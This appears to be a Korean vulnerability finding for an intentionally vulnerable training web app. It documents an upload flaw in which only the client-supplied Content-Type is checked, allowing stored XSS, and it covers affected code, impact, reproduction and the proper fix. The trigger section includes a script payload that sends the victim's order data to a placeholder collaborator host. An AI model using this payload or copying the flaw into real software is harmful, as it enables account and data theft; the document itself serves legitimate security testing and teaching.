# VULN-018 파일 업로드 Content-Type 신뢰 → 앱 오리진 저장형 XSS

- 대상 스택: node-express, java-spring (동일)
- 심각도: High
- 분류: A02:2025 Security Misconfiguration / A05 Injection (CWE-434 Unrestricted Upload)

## 위치

- `apps/node-express/src/uploads.js` — `fileFilter` 가 확장자 화이트리스트를 버리고 `file.mimetype.startsWith('image/')` 만 확인. 저장 파일명은 여전히 `randomUUID + path.extname(originalname)` 이므로 `poc.html` 을 `Content-Type: image/png` 로 올리면 `<uuid>.html` 로 저장.
- `apps/java-spring/.../storage/Uploads.java` — `isAllowed()` 가 `file.getContentType().startsWith("image/")` 만 검사. `store()` 는 원본 확장자 유지.
- 두 스택 모두 매직바이트/실제 콘텐츠 검증 없음. `/uploads/*` 는 인증 없이 `Content-Disposition` 없이 확장자 기반 Content-Type 으로 정적 서빙되고, nginx 가 SPA 와 동일 오리진(`localhost:8090`)으로 프록시.

## 트리거 방법

```
POST /api/node/profile/avatar
Content-Type: multipart/form-data
  filename="x.html"  Content-Type: image/png
  <script>fetch('/api/node/orders').then(r=>r.json()).then(d=>new Image().src='https://<collab>/'+btoa(JSON.stringify(d)))</script>

→ 응답 {"avatarUrl":"<uuid>.html"}
GET http://localhost:8090/uploads/node/<uuid>.html   → text/html, 스크립트가 SPA 오리진에서 실행
```

관리자 상품 이미지 업로드(`POST /api/{node,java}/admin/products/:id/image`)도 동일 경로.
후기 이미지 업로드(VULN-025)와 공지/이벤트용 공용 업로드(`POST /api/{node,java}/admin/upload`,
`docs/features/31-events-coupons-uploads.md`)도 같은 헬퍼를 재사용하므로 동일하게 취약 —
2026-08-28 재확인 시 `/admin/upload` 로 올린 `.html` 이 `/uploads/*` 에서 `text/html` 로 서빙됨.

## 영향

- 앱 오리진에서 임의 JS 실행(저장형). 피해자가 그 URL 을 열면(또는 아바타로 노출되면) 세션 탈취·임의 API 호출.
- VULN-014(CSRF)로 아바타 업로드를 강제하면 CSRF → 저장형 XSS 체인.

## 증거 (재현 확인)

2026-09-01, 로컬 재현 확인(`:8090`, 양 스택): `Content-Type: image/png`으로 `poc.html`을
`POST /api/{node,java}/profile/avatar` 업로드 → 저장 파일명 `<uuid>.html`, `GET /uploads/{node,java}/<uuid>.html`
응답 `Content-Type: text/html`(nosniff/Content-Disposition 없음). 앱 오리진(`:8090`)에서 그 URL을 직접 열면
스크립트가 실행되는 저장형 XSS(피해자가 URL을 열거나 iframe에 넣을 때). `<img>`로 렌더되는 자리에서는
실행되지 않음.

## 조치 상태: 미조치 (의도된 취약점)

정상 구현: 매직바이트(실제 이미지) 검증 + 서버가 확장자를 강제(항상 `.png` 등) + `/uploads` 응답에 `Content-Disposition: attachment` 및 `X-Content-Type-Options: nosniff`.
